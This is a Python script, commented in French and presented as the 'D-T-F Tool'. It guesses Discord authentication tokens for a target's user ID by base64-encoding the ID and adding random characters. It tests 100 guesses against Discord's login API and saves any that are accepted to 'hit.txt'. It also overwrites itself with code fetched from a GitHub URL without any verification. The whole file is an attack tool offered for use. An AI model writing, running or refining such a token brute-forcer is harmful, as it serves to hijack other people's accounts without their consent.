import base64
import random
import string
import requests
from colorama import init
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.text import Text
from rich.table import Table

# Initialisation de Colorama et Rich
init(autoreset=True)
console = Console()

# URL pour vérifier les mises à jour
UPDATE_URL = "https://raw.githubusercontent.com/ErrorNoName/D-T-F/refs/heads/main/main.py"
LOCAL_SCRIPT = "main.py"

# Fonction pour vérifier et appliquer les mises à jour
def check_updates():
    console.print("[cyan]Vérification des mises à jour...[/cyan]")
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            with open(LOCAL_SCRIPT, "r") as local_file:
                if local_file.read() != response.text:
                    with open(LOCAL_SCRIPT, "w") as local_file:
                        local_file.write(response.text)
                    console.print("[green]Mise à jour appliquée. Redémarrez le script ![/green]")
                    exit()
                else:
                    console.print("[green]Script à jour ![/green]")
        else:
            console.print("[red]Impossible de vérifier les mises à jour.[/red]")
    except Exception as e:
        console.print(f"[red]Erreur lors de la vérification : {e}[/red]")

# Fonction pour générer un token
def generate_token(id_to_token):
    return (
        id_to_token + "." +
        ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "." +
        ''.join(random.choices(string.ascii_letters + string.digits, k=25))
    )

# Fonction principale
def main():
    # Afficher le logo au centre
    logo = """
┳┓  ┏┳┓  ┏┓
┃┃   ┃   ┣ 
┻┛   ┻   ┻ 
EZIO/ErrorNoName        
    """
    console.print(Panel(Text(logo, justify="center"), title="D-T-F Tool", style="bold cyan", expand=True))

    # Vérification des mises à jour
    check_updates()

    # Créer une interface centrée pour saisir l'ID
    id_box = Panel(
        Text("Entrez votre ID pour générer les tokens :\n", justify="center"),
        title="Saisie de l'ID",
        style="bold magenta",
        expand=True,
    )
    console.print(id_box)
    id_input = console.input("[bold cyan]→ ID TO TOKEN : [/]")

    # Encodage de l'ID
    id_to_token = base64.b64encode(id_input.encode("ascii")).decode("ascii")

    # Boîte d'attente avec bouton simulé
    console.print(
        Panel(
            Text("[bold green]Appuyez sur [ Entrée ] pour démarrer la génération et la vérification des tokens ![/bold green]", justify="center"),
            style="bold blue",
        )
    )
    console.input("")  # Attente de validation

    # Initialisation des tableaux pour les résultats
    valid_tokens = []
    invalid_tokens = []

    # Progression
    console.print("[cyan]Génération des tokens en cours...[/cyan]")
    for _ in range(100):  # Nombre de tokens à tester
        token = generate_token(id_to_token)
        headers = {'Authorization': token}
        response = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)

        if response.status_code == 200:
            valid_tokens.append(token)
        else:
            invalid_tokens.append(token)

    # Résultats dans des tableaux Rich
    table_valid = Table(title="Tokens Valides")
    table_valid.add_column("Token", justify="center")
    for token in valid_tokens:
        table_valid.add_row(f"[green]{token}[/green]")

    table_invalid = Table(title="Tokens Invalides")
    table_invalid.add_column("Token", justify="center")
    for token in invalid_tokens:
        table_invalid.add_row(f"[red]{token}[/red]")

    layout = Layout()
    layout.split_row(
        Panel(table_valid, title="Résultats Valides", style="bold green"),
        Panel(table_invalid, title="Résultats Invalides", style="bold red"),
    )
    console.print(layout)

    # Enregistrer les tokens valides dans un fichier
    with open("hit.txt", "w") as file:
        for token in valid_tokens:
            file.write(f"{token}\n")
    console.print(Panel("[bold cyan]Enregistrement des tokens valides terminé dans 'hit.txt'[/bold cyan]", style="bold green"))

# Exécution principale
if __name__ == "__main__":
    main()
